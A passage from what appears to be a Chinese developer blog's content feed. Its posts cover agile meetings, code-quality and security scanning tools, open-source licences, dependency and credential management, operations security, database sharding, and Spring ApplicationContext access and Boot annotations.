不可控的，例如医药研发。</p><p>我们把这两种行业概括为预定义过程控制和经验性过程控制。而过去我们认识的软件可以适合，预定义过程控制，也就是说，立项的第一天就能规划到项目结束，例如ERP系统、薪资系统等成熟的行业方案。而另外一些软件例如微信、京东等互联网产品，毫无疑问是需要随着经验不断调整的，这种是经验性过程控制。</p><p>显而易见，互联网产品大多无法采用预定义过程控制，更加适合经验性过程控制。敏捷开发方法是基于经验性过程控制的，因此更加适合变化性强的，过程不可控的软件开发项目。</p><p>软件行业是一个新行业吗？如果是的话，我们可以把行业划分为金融业、电信业、软件业。然而现在不是这样的，软件业充当了所有行业信息化的角色，也就是说，未来所有的公司都是软件公司。5年以前的银行可能一个项目需要10名工程师花费1年的时间，然后5名测试人员花费2个月的时间测试，然后等待领导审批最终交付给运维上线。然而目前这种情况变得不能接受，所以越来越多的项目还是转向到敏捷开发上来。</p><h2 id="敏捷开发有什么缺点和不足吗？"><a href="#敏捷开发有什么缺点和不足吗？" class="headerlink" title="敏捷开发有什么缺点和不足吗？"></a>敏捷开发有什么缺点和不足吗？</h2><p>敏捷开发方法一点问题和缺点都没有吗？《两个凡是》的教训告诉我们，任何优秀的的思想和理论都不能迷信。实践是检验真理的唯一标准，敏捷这种方法在实际软件开发过程中也会暴露一些问题，但是可以想办法优化流程，尽量降低这些问题的影响。</p><p>敏捷软件开发的特征是增量的，因此每个迭代都会有新的业务分析，新的开发工作在进行。这带来的一个问题是，不会有一个统一的 PRD 文档出现，最后在项目结束时候，交付物中没有好的文档。所以敏捷往往强调可交付的软件更为重要，在代码质量上下功夫，做到代码即文档。</p><p>敏捷中参与人员都是根据团队划分的，例如独立的PM、BA、DEV，不再存在管理部分、研发部门。带来的矛盾是对个体的要求变高了，有时候往往一个团队中只有一个BA或者UI，对新人挑战较大。</p><p>上面提到的敏捷是根据团队来划分的，其组织架构和传统的公司部门形式提出了挑战。如果企业的组织架构没有改变，敏捷团队的存在可能会出现组织架构上的矛盾。</p><h2 id="敏捷实践中这么多会议怎么办？"><a href="#敏捷实践中这么多会议怎么办？" class="headerlink" title="敏捷实践中这么多会议怎么办？"></a>敏捷实践中这么多会议怎么办？</h2><p>对敏捷这种方法论最大的质疑就是会变多了，整体效率被拉低了。所以网友调侃 “白天搞敏捷，晚上写代码”。</p><p>会议变多的主要原因在前文已经分析过了，迭代变多，原来只需要开一次的会议，现在每个迭代都需要开一次。我待过得一些敏捷团队中，确实有一些会议花费的时间比较，敏捷开发中常见的会议有：每日站会、迭代计划、项目回顾会议、产品展示会议等。</p><p><img src="/team/team/why-need-agile/2590709963.jpg" alt="scrum meeting.jpg"></p><p>需要特别说明的是，看似这些会比较多，实际上我们使用瀑布的时候，项目初期甚至拿了全天的时间来开会。因此在敏捷中，我们每个迭代的会议是不是也要像迭代一样被摊薄呢。</p><p>如果我们设定一个迭代的时间是两周，那么迭代计划开了一整天就没有时间进行开发和干活了。</p><p>因此各个会议的推荐时间是：</p><ul><li>站会应该咋15分钟内完成</li><li>迭代计划会议不超过2小时</li><li>回顾会议不应该超过1小时</li><li>产品展示会议不应该超过30分钟</li></ul><p>如何做到把会议开到如此高效呢？这个就是对会议主持人的要求了，一些要点如下：</p><ul><li>站会的目的是更新进度和暴露开发中遇到的问题，不应该讨论具体的问题。</li><li>在开迭代计划会议之前应该准备好所有的需求分析，如果遇到需求不合理应该及时跳过，不应该在会议中寻求解决方案。</li><li>回顾会议应该把重点放到上一次行动是否明确执行以及需要改进点上。可以通过投票讨论优先级高的改进点。</li><li>参会人员应该准时到达。对迟到的容忍就是对准时到的人惩罚。</li><li>每个会议必须有主持人、会议目标、会议准备，否则会议是冗长而无效的。</li></ul><h2 id="有了看板、站会、回顾会议就敏捷吗？"><a href="#有了看板、站会、回顾会议就敏捷吗？" class="headerlink" title="有了看板、站会、回顾会议就敏捷吗？"></a>有了看板、站会、回顾会议就敏捷吗？</h2><p>敏捷是一种理念和价值观，具体的软件开发方法主要是 Scrum，那么采用了 Scrum 中的实践就敏捷了吗？</p><p>第一个问题中谈到，敏捷的关键是迭代和响应变化。那么我们把瀑布模型，拆分成多个迭代进行，是不是也是一种敏捷方式了。这种“朴素”的敏捷方式可以没有看板、站会、回顾。只有需求、分析、开发、测试这些过程，那么不能说不算敏捷吧。</p><p>如果我们没了迭代，再看看我们的看板、站会、回顾会议还是什么：</p><ul><li>看板，最早是出现于工业企业中。是一种在工业企业的工序管理中，以卡片为凭证，定时定点交货的管理制度。在没有迭代的情况下，看板只是一种过程可视化工具，对工作过程并没有任何变化。</li><li>站会，大多数公司都有晨会的概念，用于向团队内部同步前一天和当天的信息。至于是否是站着开，并不重要。站着开只是为了让会议更快结束。</li><li>回顾会议（Retro），回顾会议在英文中又叫 Retro，作用就是在一个工作阶段后进行反思和回顾的会议。这种回顾会议很多公司都会进行，比较著名的形式有从美国陆军流传而来的 ARR （After Action Review）。</li></ul><p>敏捷的实践很重要，是团队重要的活动，但并不意味着采纳了一些敏捷实践，团队就是按照敏捷的方式运作。</p>]]></content>
      
      
      <categories>
          
          <category> team </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>软件规范化指南</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/normalize-project/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/normalize-project/</url>
      
        <content type="html"><![CDATA[<p>对于一个软件开发团队，可以通过哪些代码质量指标和扫描方法让团队产出规范、安全、高质量的代码？让开发团队运行的安全、透明、可靠？</p><p>本文总结了其中一些实践和工具，包含常见代码质量扫描工具、代码质量指标、第三方依赖管理、安全运维等几个方面，主要适用于 Java/JavaScript 技术栈的 web 项目，希望对于想要规范化自己的项目的 Tech Lead 有所帮助。</p><p><strong>代码扫描和常见质量指标</strong></p><p>“祸患常积于忽微”，往往一些奇怪的 bug 都是一些不规范的小问题造成的。德国飞机涡轮机的发明者帕布斯·海恩提出的一个在航空界关于飞行安全的法则，法则指出: 每一起严重事故的背后，必然有 29 次轻微事故和 300 起未遂先兆以及 1000 起事故隐患。应用于软件开发中，如果项目中代码混乱不堪，必然会在某个时候最终爆发大量的问题。</p><p>这里整理了一些常见的扫描工具和代码质量指标，可以在搭建项目基础设施时引入，用于自动化的检查代码中潜在的问题，达到控制代码产出质量的目的。</p><p><strong>扫描工具</strong></p><p><strong>checkstyle</strong></p><p>checkstyle 是常用于 java 项目的扫描工具，检查源代码是否与代码规范相符，检查项目主要包括：Javadoc 注释、imports、过长的类和方法、空格、重复文件、圈复杂度等，默认使用 sun 的代码规则，也可以配置自定义的代码规则，例如阿里就发布了相应的检查规则。</p><p><strong>findbugs</strong> </p><p>通过 Bug Patterns 的概念，寻找代码中可能出现的 bug，检查项目主要包括：不良编程习惯导致的问题、性能问题、安全问题、线程问题等。例如，应使用 equals 判断相等，而不是 “ =” 操作符、流需要关闭、线程资源需要释放等问题。findbugs 的模式库对编程经验也有较好的提升作用。还可以导入和编写自己的 Bug Patterns 完善检查机制。</p><p><strong>simian</strong></p><p>simian 是一个用于检查重复和相似代码的工具，它的重复检查类似于论文查重，会提示一定的相似度。可以单独运行，也可以作为 checkstyle 插件来使用，相对来来说比较小众。</p><p><strong>pmd</strong></p><p>pmd 是一款跨语言的通用静态扫描工具，具备一部分 checkstyle、findbugs 的功能，不再赘述。</p><p><strong>ESlint/TSlint</strong></p><p>前端界的 checkstyle , TSlint 设计用来做 TypeScript 类型检查，ESlint 作为代码风格检查工具。不过现在 ESlint 也提供了TypeScript 类型检查功能，基本上 ESlint 能整合这两个功能。由于性能问题， TypeScript 也采用了 ESLint 作为 TSlint替代的检查工具。</p><p><strong>SonarQube</strong></p><p>SonarQube 是一款用于代码质量管理的开源工具，它主要用于管理源代码的质量。 SonarQube 和上面的工具不太一样，SonarQube 设计目的是提供一个平台，通过插件的方式提供对各个语言进行支持，也可以和 checkstyle、pmd、simian 等工具进行集成。SonarQube 一般需要单独部署成一个服务，提供数据库，可以记录扫描结果等信息。</p><p><strong>npm audit</strong></p><p>npm audit 是 npm 6 之后的版本 自带的一个前端安全扫描工具，可以扫描 npm 依赖中的潜在的漏洞威胁。这些引入的漏洞可能威胁用户开发的机，另外也可能被带入 bundle 文件发布到线上，带来安全问题。目前 npm audit 会在 npm install 完成后自动执行，需要留意安全威胁报告</p><p><strong>Fortify SCA</strong></p><p>Fortify SCA(Source Code Analyzer) 是一款非常优秀的代码安全扫描工具，用于分析代码中潜在的安全问题。通过调用语言的编译器或者解释器把代码（Java、C、C++等源代码）转换成一种中间媒体文件 NST（Normal Syntax Trcc），然后通过模式匹配相关的方式抓取存在于漏洞库中的漏洞。例如，上传的文件没有做检查等 XSS 攻击。</p><p><strong>OWASP  Dependency-Track</strong></p><p>开放式 Web 应用程序安全项目（OWASP）是一个非营利组织，提供了很多安全标准、数据库、社区和培训。其中一个工具就是 OWASP  Dependency-Track，可以对第三方依赖包中的知名漏洞进行检查，扫描结果受到漏洞数据库的更新影响。</p><p><strong>archunit 架构规范检查</strong></p><p>前面的检查是代码层面，archunit 可以用于代码架构检查，可以定义规则检查每个包中的实现是否符合规范。例如，controller 包中的类不能实现 service 的接口，repository 下的类必须实现 Repository 接口。通过 archunit 可以减少 codereview 的工作量，避免项目的结构被破坏。</p><p><strong>统计工具</strong></p><p>sloccount、sourcemointor 这两个工具可以用于统计代码数量，包括行数、文件数、注释等。除了在项目中扫描 bug 之外，配置代码统计工具可以对项目有一个整体的认知。</p><p>其他的扫描工具还很多，例如 coverity、codemars、binscope、synk、appscan、retire.js 等工具，不再一一列举。</p><p><strong>最佳搭配</strong></p><p>这几款工具之间的功能有所重叠，在实际工作中，我们可以根据上面推荐的关注的点，重点清除这些问题。这些扫描工具全部用上除了会带来团队压力和维护成本之外，代码质量不会随着引入的插件增多。除开有质量团队的大厂提供这些扫描平台外，敏捷团队往往不会太大，团队持续关注一个精简的扫描组合更好。</p><p>Java 后端：</p><ol><li><strong>checkstyle</strong> Java 代码风格守护，Java 项目至少应该配置一个默认的 checkstyle 规则。至少让项目干净，没有无用、重复的代码，以及超大的类和方法。建议做到每次提交代码前检查。</li><li><strong>findbugs</strong> 常见不规范的代码检查，一些空指针、equals 检查非常有用，而且 IDE  的插件也很好用。</li></ol><p>前端：</p><ol><li><strong>eslint</strong> 守护 JavaScript 代码风格，eslint 搭配一个 .editorconfig ，可以方便的让编辑器保持同 eslint 一致的代码风格。</li><li><strong>npm audit</strong> 项目中第三方包的威胁扫描，npm 自带无需额外安装，npm 6 以后自运行，需要关注并修复报出的安全问题。</li></ol><p>安全：</p><ol><li><strong>fortify</strong> 扫描代码中的漏洞，用它检查出来的大部分安全问题都是注入攻击、XSS 等攻击，这些问题明显可以在开发过程中避免。可以作为 Jenkins 插件配置，和单元测试作为同一阶段运行。</li><li><strong>OWASP 插件</strong>  用来扫描第三方依赖漏洞，因为项目中的依赖不会像源代码一样频繁变化，推荐使用 Jekins 插件，定期执行即可。</li></ol><p>为什么不用 SonarQube 呢，SonarQube 是一个非常优秀的代码质量开放平台，需要单独的配置安装，需要花费额外的时间维护，对于小团队来说成本较高，如果有专门的质量团队可以考虑维护一套。</p><p><strong>常用代码质量指标参考</strong></p><ol><li><strong>编译告警数</strong>，大部分程序员基本上忽略 warning，但是编译器出现了告警是一种不好的体现，意味着软件可能工作，但是存在不好的实践，而这种不确定性，会带来不确定的 bug 最终让人一头雾水。编译过程中的告警，尽量消除掉，编译告警的值推荐消除到 0。</li><li><strong>平均函数代码行数</strong>，过大的函数会导致阅读困难，而且往往过大的函数职责不够单一，一般将一个方法代码行数控制到 30 - 50 行。</li><li><strong>平均文件代码行</strong>，和平均函数代码行一样，过长的文件一样难以维护，一般一个文件10多个方法，因此文件的代码行数一般控制到 300 - 500 行。</li><li><strong>冗余代码</strong>，有时候我们代码中可能存在未使用的方法、变量等代码，这让维护者一头雾水，通常需要清零。</li><li><strong>总文件重复率</strong>，出现重复文件的次数。除了编写单元测试的情况下，业务代码不应该出现重复代码，推荐值为 0。</li><li><strong>总代码重复度</strong>，代码的重复度检查，限于扫描工具的识别模式，需要有一定的容忍度，推荐值在 5% - 10%</li><li><strong>平均函数圈复杂度</strong>，圈复杂度用来衡量一个模块判定结构的复杂程度。如果一个方法内部有大量的 if 语句嵌套，意味着这个方法的实现质量低下，且程序复杂度高不利于维护，推荐值小于 5%。</li><li><strong>安全告警</strong>，如果配置了安全扫描工具，例如 Fortify，安全威胁应该被清零。</li><li><strong>代码缺陷</strong>，如果配置了缺陷扫描工具，例如 Findbus，需要清零。</li></ol><table><thead><tr><th>检查项</th><th>建议的扫描工具</th><th>推荐值</th></tr></thead><tbody><tr><td>代码风格检查</td><td>checkstyle/eslint</td><td>0</td></tr><tr><td>编译告警数</td><td>checkstyle</td><td>0</td></tr><tr><td>平均函数代码行</td><td>checkstyle</td><td>30-50</td></tr><tr><td>平均文件代码行</td><td>checkstyle</td><td>300-500</td></tr><tr><td>冗余代码</td><td>checkstyle</td><td>0</td></tr><tr><td>总文件重复率</td><td>checkstyle</td><td>0</td></tr><tr><td>总代码重复度</td><td>checkstyle</td><td>5% - 10%</td></tr><tr><td>平均函数圈复杂度</td><td>checkstyle</td><td>&lt;=5%</td></tr><tr><td>安全告警</td><td>sonarqube/fortify</td><td>0</td></tr><tr><td>代码缺陷</td><td>findbugs</td><td>0</td></tr></tbody></table><p><strong>第三方依赖规范化</strong></p><p>软件开发过程中，不可避免的需要引入第三方或者开源软件包作为库或者框架引入。“第三方” 其实不是一个软件工程术语，现今在软件行业里面的理解是：第一方为自研的软件，第二方为内部发布的软件，第三方为从社区或者外部商业途径引入的软件包。</p><p>对于个人开发者而言，面向“搜索引擎”编程往往将来源不明的代码片段和程序包引入到项目中。对于企业来说，考虑到的不仅仅是功能是否能实现，还要考虑引入时带来的成本和问题，例如是否需要授权、开源协议是否合理、是否会带来安全威胁。</p><p>企业对于第三方依赖的引入分为几种情况：</p><ol><li><strong>作为开发工具引入</strong>，例如 gcc、Jenkins，基本没有开源协议问题，但是需要注意开发机、CI 会有安全风险。Jenkins 曾出现过漏洞，CI 服务器被当做远程矿机使用。</li><li><strong>作为服务部署使用（SaaS）</strong>，部分开源协议会限制这种使用方式，第三方依赖的安全问题会威胁服务器。</li><li><strong>通过软件包再发布</strong>，大部分开源软件对这种使用方式有较多要求，例如 GPL 开源协议具有传染性，要求使用了 GPL 的项目也要开源。</li><li><strong>拷贝源代码引入项目</strong>，非常不推荐这种方式，尽量通过包管理的方式引入。</li></ol><p>引入第三方依赖需要充分考虑，尽可能最小成本的引入。在一个 React 的前端项目中，有不熟悉的工程师，为了使用一个简单的手风琴效果，引入了整套 bootstrap。不仅破坏了使用 React 的最佳实践，而且让输出的 bundle 文件大小激增数倍，造成首屏加载的性能问题。</p><p><strong>常见商业友好的开源协议</strong></p><p>商业用户常用的开源协议实际上只有6种左右，即 LGPL、Mozilla、GPL、BSD、MIT、Apache，另外还有极其宽松的 The Unlicense，但采用的开源软件不多。</p><p>GitHub 提供了一个 license 清单的列表 <a href="https://choosealicense.com/licenses/，我根据开源协议的宽松程度，整理了一个列表，方便查看：" target="_blank" rel="noopener">https://choosealicense.com/licenses/，我根据开源协议的宽松程度，整理了一个列表，方便查看：</a></p><table><thead><tr><th>开源协议</th><th>简介</th><th>主要权利</th><th>主要条件</th></tr></thead><tbody><tr><td>MIT License</td><td>名称来源于麻省理工学院的许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息</td></tr><tr><td>BSD</td><td>伯克利软件分发许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息不可以用开源项目名字和作者用于商业推广</td></tr><tr><td>Apache License 2.0</td><td>Apache许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息对源代码的修改需要提供文档说明</td></tr><tr><td>Mozilla Public License 2.0</td><td>Mozilla小组设计的许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息基于该协议之上的项目需要采用相同的协议继续开源，但是开源范围只是改变的文件级别，无需整个项目开源</td></tr><tr><td>GNU LGPLv3</td><td>GUN 宽通用许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息对源代码的修改需要提供文档说明基于该协议之上的项目需要采用相同的协议继续开源，如果使用library的方式可以不用开源</td></tr><tr><td>GNU GPLv3</td><td>GUN 通用许可协议</td><td>可商业使用，并用于盈利可再次发布允许修改源代码包含专利使用权利</td><td>保留版权信息基于该协议之上的项目需要采用相同的协议继续开源</td></tr></tbody></table><p>几乎所有的开源协议有一个共同的注意事项：<strong>采用该开源协议的软件项目，不提供任何责任转移和质量保证。</strong>也就是说采用开源软件造成的法律问题和开源项目无关，另外需要使用者承担因质量问题造成的所有后果。另外，除了引入的程序包之外，字体、图片、特效音、手册等媒体资源也算广义上的“软件”需要考虑开源协议和使用场景。</p><p><strong>第三方依赖管理</strong></p><p>对项目中出现的任何第三方依赖有效的管理有非常重要的意义，通过扫描工具，识别出项目中是否有源码、jar包、二进制文件是否来源于某个开源项目。</p><p>任何的第三方软件需要申请入库管理（内部其他团队申请通过可以直接使用），质量团队对申请的软件进行评估：</p><ol><li>是否有开源义务需要履行</li><li>引入的第三方依赖是否有 CVEs等漏洞</li><li>第三方开源软件是否仍然在维护</li></ol><p>质量团队根据上面的一些条件，决定出申请的软件能否在项目中使用，允许被采用的软件会定义出优选级别，优先推荐团队使用较为优选的软件，并对项目整体的优选率有一定要求。如果项目中出现了无法识别的二进制文件、非约定目录下的代码片段，需要报备。通过良好的依赖管理和规范化，能减少不良第三方依赖的引入，让软件项目透明、可信。</p><p>一些商业公司提供这些完整的服务，例如 fossid、blackduck、code-climate 等。</p><p><strong>运维安全</strong></p><p>大的软件公司，往往有一堆流程和要求。虽然一线开发对堡垒机、防火墙、各种安全规范显得不耐烦，但这些安全措施也在保护开发者。</p><p><strong>防火墙用于环境隔离</strong></p><p>往往开发者理解的防火墙用于防止网络入侵、审计、入侵检测等功能，除此之外，防火墙还可以用于各个环境的隔离。一般来说，企业对于生产环境的数据控制比较严格，不会将生产环境的权限交给团队所有开发者，但网络连接有可能疏漏。</p><p>曾经出现过一次线上事故，由于配置文件错误，将原本应该连接到测试的数据库连接到了生产环境，造成大量脏数据写入。如果通过防火墙规则对各个环境进行隔离，这类问题将不会出现。</p><p>另外也可以设计 DMZ 区，将面向用户侧的网关部署到 DMZ 区，仅仅开放必要的端口给网关，实现内外网的物理隔离。同时，对整个系统的防火墙策略应该清晰地记录，否则在做大的基础设施更新时，梳理出所有的防火墙策略，是一件比较困难的事情。</p><p><strong>凭据管理</strong></p><p>项目中会用到大量的凭据，例如数据库、第三方系统对接的 key，使用明文不是一件好事。理想的情况下，对项目中所有的密码信息进行掩盖(mask)，避免 CI、日志中敏感信息的泄露。</p><p>有很多种方法可以掩盖项目中的密码信息：</p><ol><li>使用环境变量对密码信息进行覆盖</li><li>使用Spring boot 的项目可以配置 jasypt，使用 jasypt 将密码加密，将生成的加密串配置 ENC(加密串) 到工程的配置文件中。加密过程可以加盐作为解密的凭据，“盐” 可以不存放到工程中，在工程部署的时候注入即可</li><li>如果使用 Jenkins 等 CI/CD 工具，可以使用构建平台提供的凭证管理工具</li><li>如果使用 Spring cloud，可以使用 spring cloud vault 组件部署一个凭证管理服务</li></ol><p>另外，建议不要用任何个人凭据用作系统对接，应该使用一个公共的应用凭据。</p><p><strong>堡垒机</strong></p><p>一般来说我们管理服务器，所有的运维操作需要通过堡垒机进行操作。开放 22 等高危端口，允许开发者直接登录到服务器是一种不安全的做法。</p><p>堡垒机，通俗的来说是跳板机 + 监控。最初使用的跳板机配置了两张网卡，用于连接开发环境和生产环境，并没有监控功能。在此基础上，堡垒机增加了统一运维管理的功能，往往需要两步验证（SMS 或 Email），并对所有的操作进行记录和监控。</p><p>在需要团队参与运维工作的场景中，非常有必要部署一套堡垒机服务，并使用 LDAP 对接到团队成员的 ID 上，便于集中运维管理。</p><p><strong>定期对系统软件扫描</strong></p><p>Linux 系统往往有云厂商推送安全补丁和风险提示，但是安装到服务器上的软件，例如 JDK、nodejs，需要自己检查安全问题。因此需要在系统中安装并定期运行 CVEs 检查并及时更新。有一款 cvechecker 可以帮助运维人员，编写一个脚本定期运行 cvechecker  检查系统中已知的软件是否存在 CVEs 漏洞，并提醒开发者及时更新。</p><p><strong>写在后面</strong></p><p>刚开始工作时候，喜欢动态的、灵活的编程语言，讨厌的死板的、套路化的编程语言，然而需要很长一段时间，才能意识到 “约束是程序员的朋友”。对一些安全知识了解的来源大多来自修复 SonarQube 的经历，使用 findbugs 也让我对 Java 基础认识的更加深刻。</p><p>类似的，在使用一些框架、平台的时候往往存在大量的限制，有时候开发者难以意识到 “限制” 正是框架、平台的作者 “保护” 应用开发者的一种方式。有一些开发者以 Hack 框架、平台为乐，但是这样会带来潜在的隐患，在用户量上来之后负面效应表现的尤为明显。</p><p>项目的规范化对于 Tech Lead来说可以减少程序的运行事故和 codereview 时间，对于团队来说也许可以少加班吧。</p>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>分库分表方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/database-sharding/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%96%B9%E6%A1%88/solution/database-sharding/</url>
      
        <content type="html"><![CDATA[<p><img src="/技术方案/solution/database-sharding/image-20200411185919412.png" alt="image-20200411185919412"></p><p>mysql的数据其实是存储在b+tree上的.一般业内的认知是 索引深度不超过4层.3层的索引. 能存储的数据行数其实是能计算出来的.所以为了要保证查询高效. 算一下每张表大概多少量级数据.. 拆分的时候根据总量计算出拆多少个分区.</p><p>然后用mycat中间件. 拆分就行,基本上 三层索引. 主键是32位uuid. 每行数据1k.  单表500w -1000w就是最大量级了.mycat拆分时的策略 就是对一个拆分键去取模.. 取模的方式常见的就是hash.</p><p>不过现在很多技术都用的另外一个hash算法. 叫一致性hash.</p><p>有时间把mycat. 一致性hash. jumpstringhash 这几个知识点看看就够了.</p><p>单表500w-1000w这个都没啥说的了. 业内共识. 如果你想知道算法.有时间可以交流</p>]]></content>
      
      
      <categories>
          
          <category> 技术方案 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>如何编写清晰的架构方案</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/how-to-write-solution-doc/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/how-to-write-solution-doc/</url>
      
        <content type="html"><![CDATA[<h3 id="技术攻关的步骤"><a href="#技术攻关的步骤" class="headerlink" title="技术攻关的步骤"></a>技术攻关的步骤</h3><ol><li>需求和问题澄清</li><li>现状分析</li><li>技术方案初稿</li><li>DEMO</li><li>方案评审</li><li>实施</li></ol>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>批量任务执行</title>
      <link href="/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/batch/"/>
      <url>/%E6%8A%80%E6%9C%AF%E6%9E%B6%E6%9E%84/architecture/batch/</url>
      
        <content type="html"><![CDATA[<h2 id="痛点"><a href="#痛点" class="headerlink" title="痛点"></a>痛点</h2><ul><li>能分片跑</li><li>能看到进度</li><li>中途失败能重启</li><li>能手动干预启停</li></ul><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><h3 id="批量任务核心概念"><a href="#批量任务核心概念" class="headerlink" title="批量任务核心概念"></a>批量任务核心概念</h3><h3 id="其他方案"><a href="#其他方案" class="headerlink" title="其他方案"></a>其他方案</h3><ul><li>kettle</li><li>sqoop</li><li>datax</li></ul><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>Spring batch 官方文档 <a href="https://docs.spring.io/spring-batch/docs/4.2.x/reference/html/index-single.html#spring-batch-intro" target="_blank" rel="noopener">https://docs.spring.io/spring-batch/docs/4.2.x/reference/html/index-single.html#spring-batch-intro</a></li><li>批处理框架spring batch基础知识介绍<a href="https://blog.csdn.net/topdeveloperr/article/details/84337956#如何默认不启动job" target="_blank" rel="noopener">https://blog.csdn.net/topdeveloperr/article/details/84337956#%E5%A6%82%E4%BD%95%E9%BB%98%E8%AE%A4%E4%B8%8D%E5%90%AF%E5%8A%A8job</a></li><li>大数据批处理框架Spring Batch 的全面解析 <a href="https://blog.csdn.net/weixin_44233163/article/details/85992105" target="_blank" rel="noopener">https://blog.csdn.net/weixin_44233163/article/details/85992105</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 技术架构 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>获取 Spring 的 ApplicationContext</title>
      <link href="/Spring/spring/spring-get-application-context/"/>
      <url>/Spring/spring/spring-get-application-context/</url>
      
        <content type="html"><![CDATA[<h2 id="获取-Spring-的-ApplicationContext"><a href="#获取-Spring-的-ApplicationContext" class="headerlink" title="获取 Spring 的 ApplicationContext"></a>获取 Spring 的 ApplicationContext</h2><h2 id="通过Spring提供的工具类获取ApplicationContext对象"><a href="#通过Spring提供的工具类获取ApplicationContext对象" class="headerlink" title="通过Spring提供的工具类获取ApplicationContext对象"></a>通过Spring提供的工具类获取ApplicationContext对象</h2><pre><code>import org.springframework.web.context.support.WebApplicationContextUtils;ApplicationContext ac1 = WebApplicationContextUtils.getRequiredWebApplicationContext(ServletContext sc);ApplicationContext ac2 = WebApplicationContextUtils.getWebApplicationContext(ServletContext sc);ac1.getBean(&quot;beanId&quot;);ac2.getBean(&quot;beanId&quot;);</code></pre><p>说明:这种方式适合于采用Spring框架的B/S系统，通过ServletContext对象获取ApplicationContext对象，然后在通过它获取需要的类实例。</p><p>上面两个工具方式的区别是，前者在获取失败时抛出异常，后者返回null。</p><h2 id="继承自抽象类ApplicationObjectSupport"><a href="#继承自抽象类ApplicationObjectSupport" class="headerlink" title="继承自抽象类ApplicationObjectSupport"></a>继承自抽象类ApplicationObjectSupport</h2><p>说明：抽象类ApplicationObjectSupport提供getApplicationContext()方法，可以方便的获取到ApplicationContext。<br>Spring初始化时，会通过该抽象类的setApplicationContext(ApplicationContext context)方法将ApplicationContext 对象注入。</p><h2 id="实现接口ApplicationContextAware"><a href="#实现接口ApplicationContextAware" class="headerlink" title="实现接口ApplicationContextAware"></a>实现接口ApplicationContextAware</h2><p>说明：实现该接口的setApplicationContext(ApplicationContext context)方法，并保存ApplicationContext 对象。<br>Spring初始化时，会通过该方法将ApplicationContext对象注入。</p><p>虽 然，spring提供了后三种方法可以实现在普通的类中继承或实现相应的类或接口来获取spring 的ApplicationContext对象，但是在使用是一定要注意实现了这些类或接口的普通java类一定要在Spring 的配置文件application-context.xml文件中进行配置。否则获取的ApplicationContext对象将为null。</p><pre><code>package quartz.util;import org.springframework.beans.BeansException;import org.springframework.context.ApplicationContext;import org.springframework.context.ApplicationContextAware;public class SpringConfigTool implements ApplicationContextAware{//extends ApplicationObjectSupport{private static ApplicationContext context = null;private static SpringConfigTool stools = null;public synchronized static SpringConfigTool init(){  if(stools == null){   stools = new SpringConfigTool();  }  return stools;}public void setApplicationContext(ApplicationContext applicationContext)throws BeansException {  context = applicationContext;}public synchronized static Object getBean(String beanName) {  return context.getBean(beanName);}}</code></pre><h3 id="通过-class-loader-获取"><a href="#通过-class-loader-获取" class="headerlink" title="通过 class loader 获取"></a>通过 class loader 获取</h3><p>org.springframework.web.context.ContextLoader</p><p>Title1 import org.springframework.web.context.ContextLoader;<br>import org.springframework.web.context.WebApplicationContext; </p><p>WebApplicationContext wac = ContextLoader.getCurrentWebApplicationContext();<br>  wac.getBean(beanID);</p>]]></content>
      
      
      <categories>
          
          <category> Spring </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Spring boot 常用注解</title>
      <link href="/Spring/spring/spring-boot-annotations/"/>
      <url>/Spring/spring/spring-boot-annotations/</url>
      
        <content type="html"><![CDATA[<h2 id="常用配置注解"><a href="#常用配置注解" class="headerlink" title="常用配置注解"></a>常用配置注解</h2><h3 id="SpringBootApplication"><a href="#SpringBootApplication" class="headerlink" title="@SpringBootApplication"></a>@SpringBootApplication</h3><p>这是 Spring Boot 最最最核心的注解，用在 Spring Boot 主类上，标识这是一个 Spring Boot 应用，用来开启 Spring Boot 的各项能力。</p><p>其实这个注解是 </p><ul><li>@SpringBootConfiguration</li><li>@EnableAutoConfiguration</li><li>@ComponentScan </li></ul><p>这三个注解的组合，也可以用这三个注解来代替 @SpringBootApplication 注解。</p><h3 id="EnableAutoConfiguration"><a href="#EnableAutoConfiguration" class="headerlink" title="@EnableAutoConfiguration"></a>@EnableAutoConfiguration</h3><p>允许 Spring Boot 自动配置注解，开启这个注解之后，Spring Boot 就能根据当前类路径下的包或者类来配置 Spring Bean。</p><p>如：当前类路径下有 Mybatis 这个 JAR 包，MybatisAutoConfiguration 注解就能根据相关参数来配置 Mybatis 的各个 Spring Bean。</p><h3 id="Configuration"><a href="#Configuration" class="headerlink" title="@Configuration"></a>@Configuration</h3><p>这是 Spring 3.0 添加的一个注解，用来代替 applicationContext.xml 配置文件，所有这个配置文件里面能做到的事情都可以通过这个注解所在类来进行注册。</p><h3 id="SpringBootConfiguration"><a href="#SpringBootConfiguration" class="headerlink" title="@SpringBootConfiguration"></a>@SpringBootConfiguration</h3><p>这个注解就是 @Configuration 注解的变体，只是用来修饰是 Spring Boot 配置而已，或者可利于 Spring Boot 后续的扩展。</p><h3 id="ComponentScan"><a 